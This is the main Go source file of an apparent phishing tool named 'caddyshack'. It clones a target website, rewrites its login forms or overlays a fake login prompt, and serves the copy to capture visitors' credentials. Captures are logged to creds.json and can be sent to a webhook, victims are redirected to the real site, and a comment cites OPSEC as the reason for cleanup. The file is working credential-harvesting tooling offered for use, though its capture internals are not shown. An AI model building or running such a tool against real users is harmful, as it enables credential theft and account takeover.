package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"path/filepath"
	"syscall"

	"github.com/BLTSEC/caddyshack/internal/banner"
	"github.com/BLTSEC/caddyshack/internal/cloner"
	"github.com/BLTSEC/caddyshack/internal/config"
	"github.com/BLTSEC/caddyshack/internal/logger"
	"github.com/BLTSEC/caddyshack/internal/rewriter"
	"github.com/BLTSEC/caddyshack/internal/server"
	"github.com/BLTSEC/caddyshack/internal/webhook"
)

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		os.Exit(1)
	}
}

func run() error {
	banner.Print()

	cfg := config.Default()

	flag.StringVar(&cfg.TargetURL, "url", "", "Target URL to clone (required)")
	flag.IntVar(&cfg.Port, "port", cfg.Port, "Listen port (default: 8080)")
	flag.BoolVar(&cfg.EnableTLS, "tls", false, "Enable HTTPS")
	flag.StringVar(&cfg.CertFile, "cert", "", "TLS certificate file")
	flag.StringVar(&cfg.KeyFile, "key", "", "TLS private key file")
	flag.StringVar(&cfg.OutputFile, "output", cfg.OutputFile, "Credential log file (default: creds.json)")
	flag.StringVar(&cfg.RedirectURL, "redirect", "", "Post-capture redirect URL (default: target URL)")
	flag.StringVar(&cfg.UserAgent, "user-agent", cfg.UserAgent, "User-Agent string for cloning requests")
	flag.StringVar(&cfg.WebhookURL, "webhook", "", "Webhook URL for credential notifications")
	flag.BoolVar(&cfg.InsecureTLS, "insecure", false, "Skip TLS verification when cloning target")
	flag.BoolVar(&cfg.Overlay, "overlay", false, "Silence site network requests and inject a themed login overlay")
	flag.BoolVar(&cfg.Verbose, "verbose", false, "Enable verbose debug output")
	flag.Parse()

	if err := cfg.Validate(); err != nil {
		flag.Usage()
		fmt.Fprintln(os.Stderr)
		return err
	}

	// Temp clone directory — auto-cleaned on exit for better OPSEC
	cloneDir, err := os.MkdirTemp("", "caddyshack-*")
	if err != nil {
		return fmt.Errorf("create temp dir: %w", err)
	}
	cfg.CloneDir = cloneDir
	defer os.RemoveAll(cloneDir)

	// Cancel context on SIGINT/SIGTERM
	ctx, stop := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer stop()

	// Clone target
	fmt.Printf("[*] Cloning %s...\n", cfg.TargetURL)
	c := cloner.New(cfg.TargetURL, cloneDir, cfg.UserAgent, cfg.InsecureTLS, cfg.Verbose)
	if err := c.Clone(ctx); err != nil {
		return fmt.Errorf("clone failed: %w", err)
	}
	fmt.Println("[*] Clone complete")

	// Post-process cloned HTML
	indexPath := filepath.Join(cloneDir, "index.html")
	htmlBytes, err := os.ReadFile(indexPath)
	if err != nil {
		return fmt.Errorf("read index.html: %w", err)
	}
	var rewritten string
	if cfg.Overlay {
		rewritten, err = rewriter.ApplyOverlay(string(htmlBytes))
		if err != nil {
			return fmt.Errorf("apply overlay: %w", err)
		}
		fmt.Println("[*] Login overlay injected (network requests silenced)")
	} else {
		rewritten, err = rewriter.RewriteForms(string(htmlBytes))
		if err != nil {
			return fmt.Errorf("rewrite forms: %w", err)
		}
		fmt.Println("[*] Forms rewritten")
	}
	if err := os.WriteFile(indexPath, []byte(rewritten), 0644); err != nil {
		return fmt.Errorf("write index.html: %w", err)
	}

	// Initialize logger
	log, err := logger.New(cfg.OutputFile, cfg.TargetURL)
	if err != nil {
		return fmt.Errorf("init logger: %w", err)
	}
	defer log.Close()

	// Initialize webhook notifier (nil if no URL configured)
	notifier := webhook.New(cfg.WebhookURL)

	// Start HTTP(S) server — blocks until Ctrl-C
	fmt.Println("[*] Press Ctrl-C to stop")
	srv := server.New(cfg, log, notifier)
	if err := srv.Start(ctx); err != nil {
		return fmt.Errorf("server: %w", err)
	}

	// Session summary
	stats := log.Stats()
	fmt.Printf("\n[*] Session complete — %d capture(s) from %d unique IP(s)\n",
		stats.TotalCaptures, stats.UniqueIPs)
	return nil
}
